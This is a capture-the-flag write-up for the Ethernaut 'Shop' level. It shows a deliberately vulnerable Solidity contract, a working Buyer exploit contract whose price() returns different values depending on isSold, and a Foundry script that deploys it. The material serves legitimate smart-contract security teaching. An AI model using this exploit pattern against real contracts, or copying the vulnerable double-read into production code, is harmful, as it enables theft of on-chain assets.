# Ethernaut Level 21 Shop

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        IBuyer _buyer = IBuyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

We have to make price lower than the initial 100 value after calling the `buy()` function in the `Shop` contract. Notice that we use the `_buyer.price()` to first get into the `if` condition and then update the `price`. In `IBuyer` interface, we can see that this `price()` function is actually a `view` function, which means that it cannot change the state in the contract, but it can still read the states. So a simple attack can be implemented inside this `price()` function: if `isSold` is `false`, function returns normal price; if `isSold` is `true`, function returns a much lower price. During this process, we only read the state of the contract, but never changed any state variables.

`Buyer.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Shop} from "./Shop.sol";

contract Buyer {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 1;
        } else {
            return 100;
        }
    }

    function buy() external {
        shop.buy();
    }
}
```

`Shop.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Buyer} from "../src/Buyer.sol";

contract ShopScript is Script {
    function run() external {
        vm.startBroadcast();
        Buyer buyer = new Buyer(0xXXXXXXXX);
        buyer.buy();
        vm.stopBroadcast();
    }
}
```

